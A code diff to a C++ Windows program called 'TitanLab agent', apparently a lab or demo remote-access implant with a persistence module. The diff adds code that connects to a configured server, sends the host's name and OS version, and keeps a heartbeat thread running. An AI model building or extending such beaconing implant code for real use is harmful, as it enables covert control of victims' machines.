@@ -1,4 +1,5 @@
 #include "config.h"
+#include "network.h"
 #include "persistence.h"
 
 #include <windows.h>
@@ -11,6 +12,7 @@
 #include <sstream>
 #include <stdexcept>
 #include <string>
+#include <thread>
 #include <vector>
 
 namespace {
@@ -210,6 +212,7 @@ bool has_argument(const std::vector<std::wstring>& arguments, const wchar_t* val
 
 int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
     HANDLE mutexHandle = NULL;
+    bool winsockInitialized = false;
 
     try {
         const std::vector<std::wstring> arguments = get_command_line_arguments();
@@ -243,9 +246,33 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
             return 0;
         }
 
+        if (!initialize_winsock()) {
+            throw std::runtime_error("Failed to initialize WinSock.");
+        }
+        winsockInitialized = true;
+
+        SOCKET serverSocket = connect_to_server(config.ip.c_str(), static_cast<int>(config.port));
+        const std::string hostname = get_hostname();
+        const std::string osVersion = get_os_version();
+
+        if (!send_register(serverSocket, hostname.c_str(), osVersion.c_str())) {
+            closesocket(serverSocket);
+            throw std::runtime_error("Failed to send registration payload.");
+        }
+
+        std::thread heartbeatThread(
+            heartbeat_loop,
+            serverSocket,
+            config.ip.c_str(),
+            static_cast<int>(config.port)
+        );
+
         MessageBoxA(NULL, "TitanLab agent started (demo mode)", "Debug", MB_OK);
 
+        heartbeatThread.join();
+
         CloseHandle(mutexHandle);
+        cleanup_winsock();
         return 0;
     } catch (const std::exception& exception) {
         log_debug(std::string("TitanLab startup error: ") + exception.what());
@@ -253,6 +280,10 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
 
         if (mutexHandle != NULL) {
             CloseHandle(mutexHandle);
+        }
+
+        if (winsockInitialized) {
+            cleanup_winsock();
         }
 
         return 1;
